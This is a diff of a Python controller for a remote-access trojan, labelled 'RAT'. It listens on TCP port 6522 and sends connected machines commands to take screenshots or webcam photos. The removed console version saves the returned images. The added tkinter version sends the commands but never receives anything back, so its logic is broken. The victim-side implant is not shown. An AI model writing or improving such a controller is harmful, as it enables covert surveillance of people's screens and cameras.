@@ -1,55 +1,46 @@
-
 from socket import *
+from tkinter import *
 
-host = ''
-port = 6522
-addr = (host,port)
+def screen():
+	try:
+		host = ''
+		port = 6522
+		addr = (host,port)
+		tcp_socket = socket(AF_INET, SOCK_STREAM)
+		tcp_socket.bind(addr)
+		tcp_socket.listen(90)
+		conn, addr = tcp_socket.accept()
+		data = conn.recv(1024)
+		
+		command = '1'
+		conn.send(command.encode())
+		conn.close()
+		tcp_socket.close()
+	except:
+		pass
 
-clients = []
+def WebCam():
+	try:
+		host = ''
+		port = 6522
+		addr = (host,port)
+		tcp_socket = socket(AF_INET, SOCK_STREAM)
+		tcp_socket.bind(addr)
+		tcp_socket.listen(90)
+		conn, addr = tcp_socket.accept()
+		data = conn.recv(1024)
+		command = '2'
+		conn.send(command.encode())
+		conn.close()
+		tcp_socket.close()
+	except:
+		pass
 
-tcp_socket = socket(AF_INET, SOCK_STREAM)
+window = Tk()
+window.title("RAT")
+window.geometry("250x250")
+Label(text="Remote Administration Tools").pack()
+btn_screen = Button(text="ScreenShot", command=screen).pack()
+btn_webcam = Button(text="WebCam", command=WebCam).pack()
 
-tcp_socket.bind(addr)
-tcp_socket.listen(90)
-
-while True:
-    def screen(conn):
-        file = open("screenshot.png", "wb")
-        image_chunk = conn.recv(2048)
-        while image_chunk:
-            file.write(image_chunk)
-            image_chunk = conn.recv(2048)
-        file.close()
-        
-    def webcam(conn):
-        file = open("webcam.png", "wb")
-        image_chunk = conn.recv(2048)
-        while image_chunk:
-            file.write(image_chunk)
-            image_chunk = conn.recv(2048)
-        file.close()
-        
-    conn, addr = tcp_socket.accept()
-    data = conn.recv(1024)
-    users=[]
-    users.append(addr)
-    if not data:
-        conn.close()
-        break
-    else:
-        command = input("\n\n1 - take screenshot\n2 - take photo on webcam \n3 - Online Users\n-> ")
-        conn.send(command.encode())
-        print(command.encode())
-        if command == "1":
-            screen(conn)
-        elif command == "2":
-            webcam(conn)
-        elif command == "3":
-            for item in users:
-                print(item)
-        conn.close()
-    
-tcp_socket.close()
-
-
-
+window.mainloop()
